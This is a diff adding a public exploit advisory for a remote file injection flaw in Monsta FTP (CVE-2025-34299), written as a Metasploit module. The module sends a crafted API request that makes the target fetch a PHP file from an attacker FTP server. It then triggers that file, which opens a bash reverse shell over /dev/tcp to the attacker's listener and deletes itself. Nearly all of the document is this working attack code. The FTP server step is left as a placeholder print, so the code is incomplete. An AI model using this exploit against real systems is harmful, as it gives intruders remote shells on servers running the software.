@@ -1,0 +1,137 @@
+=============================================================================================================================================
+| # Title     : Monsta FTP 2.11 Remote File Injection                                                                                       |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
+| # Vendor    : https://www.monstaftp.com/                                                                                                  |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212150/ &  		CVE-2025-34299
+
+[+] Summary :  This Metasploit module exploits a vulnerability in Monsta FTP and enables Remote File Injection by creating a malicious FTP server. 
+               The application builds this server to upload a malicious PHP file (Reverse Shell).
+               After the file is uploaded, the module immediately verifies the possibility of reversal.
+
+
+[+] POC : 
+
+##
+# This module requires Metasploit Framework and Ruby
+##
+
+require 'msf/core'
+require 'net/http'
+require 'json'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = NormalRanking
+
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Monsta FTP CVE-2025-34299 Exploit',
+      'Description'    => %q{
+        Exploits Monsta FTP vulnerability CVE-2025-34299 to upload a PHP reverse shell
+        via a malicious FTP server.
+      },
+      'Author'         => ['Indoushka'],
+      'License'        => MSF_LICENSE,
+      'References'     =>
+        [
+          ['CVE', '2025-34299']
+        ],
+      'Platform'       => 'php',
+      'Arch'           => ARCH_PHP,
+      'Targets'        => [['Monsta FTP <= 2025-34299', {}]],
+      'DefaultTarget'  => 0,
+      'DisclosureDate' => '2025-11-21'))
+
+    register_options(
+      [
+        Opt::RHOST(),
+        Opt::RPORT(80),
+        OptString.new('TARGETURI', [true, 'Base path to Monsta FTP', '/']),
+        OptString.new('FTP_HOST', [true, 'Attacker FTP host', '172.17.0.1']),
+        OptInt.new('FTP_PORT', [true, 'Attacker FTP port', 2121]),
+        OptString.new('LHOST', [true, 'Listener host', '172.17.0.1']),
+        OptInt.new('LPORT', [true, 'Listener port', 4444])
+      ])
+  end
+
+  def generate_payload(filename)
+    "<?php $f=__FILE__; exec(\"/bin/bash -c 'bash -i >& /dev/tcp/#{datastore['LHOST']}/#{datastore['LPORT']} 0>&1 &'\"); unlink($f); ?>"
+  end
+
+  def exploit
+    print_status("Starting malicious FTP server...")
+
+    require 'webrick'
+    require 'tmpdir'
+    require 'securerandom'
+
+    ftp_dir = Dir.mktmpdir
+    random_file = "#{SecureRandom.hex(6)}.php"
+    payload_path = File.join(ftp_dir, random_file)
+
+    File.open(payload_path, 'w') { |f| f.write(generate_payload(random_file)) }
+    print_status("Payload written to #{payload_path}")
+
+    # Generate random credentials
+    user = SecureRandom.hex(4)
+    pwd = SecureRandom.hex(6)
+
+    # Start FTP server
+    print_status("FTP server would start here (simulate or run external server)")
+
+    # Prepare request to Monsta FTP API
+    api_url = normalize_uri(datastore['TARGETURI'], 'application/api/api.php')
+
+    data = {
+      connectionType: 'ftp',
+      configuration: {
+        host: datastore['FTP_HOST'],
+        username: user,
+        password: pwd,
+        port: datastore['FTP_PORT'],
+        initialDirectory: '/'
+      },
+      actionName: 'downloadFile',
+      context: {
+        remotePath: "/#{random_file}",
+        localPath: random_file
+      }
+    }
+
+    begin
+      res = send_request_cgi({
+        'method' => 'POST',
+        'uri'    => api_url,
+        'ctype'  => 'application/x-www-form-urlencoded',
+        'data'   => "request=#{data.to_json}"
+      })
+
+      if res && res.code == 200
+        begin
+          json_res = JSON.parse(res.body)
+          if json_res['success']
+            print_good("Payload uploaded successfully: #{normalize_uri(datastore['TARGETURI'], 'application/api', random_file)}")
+            print_status("Triggering reverse shell...")
+            send_request_cgi({'method' => 'GET', 'uri' => normalize_uri(datastore['TARGETURI'], 'application/api', random_file)})
+            return
+          end
+        rescue JSON::ParserError
+          print_error("Failed to parse JSON response: #{res.body}")
+        end
+      else
+        print_error("HTTP request failed")
+      end
+    rescue ::Rex::ConnectionError
+      print_error("Failed to connect to target")
+    end
+  end
+end
+
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
